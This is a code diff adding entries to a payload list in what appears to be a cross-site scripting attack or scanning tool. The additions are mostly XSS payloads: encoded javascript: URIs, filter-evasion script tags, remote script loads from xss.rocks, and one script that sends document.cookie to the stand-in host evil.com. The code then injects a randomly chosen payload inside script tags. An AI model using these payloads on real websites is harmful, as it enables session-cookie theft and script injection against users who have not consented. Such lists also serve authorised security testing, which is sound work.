@@ -13,7 +13,20 @@ class core:
 			"alert(6000/3000)",
 			"alert(document.cookie)",
 			"prompt(document.cookie)",
-			"console.log(5000/3000)"
+			"console.log(5000/3000)",
+			"javascript:confirm%28%60XssByTrkn%5cn%24%7bdocument%2edomain%7d%5cnANONYMOUS%60%29",
+			"javascript:prompt%28%2ftrkn%2f%2clocation%2eorigin%29",
+			"javascript:alert%28%2ftrkn%2f%29",
+			"javascript:alert%28%29",
+			"<a href=\"javascript:alert%28%29\">RedirectURI</a>",
+			"<script x>alert(/Xss_By_Trhacknon/)</script 1=2",
+			"<script>image = new Image(); image.src=\"https://evil.com/?c=\"+document.cookie;</script>",
+			"<<SCRIPT>alert(\"XSS\");//\<</SCRIPT>",
+			"<SCRIPT SRC=http://xss.rocks/xss.js?< B >",
+			"<IMG SRC=\"('XSS')\"",
+			"<iframe src=http://xss.rocks/scriptlet.html <",
+			"<SCRIPT>var a=\"$ENV{QUERY\_STRING}\";</SCRIPT>",
+			"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(\"XSS\")>"
 		]
 		if eff == 1:
 			return "<script/>"+FUNCTION[randint(0,4)]+"<\script\>"
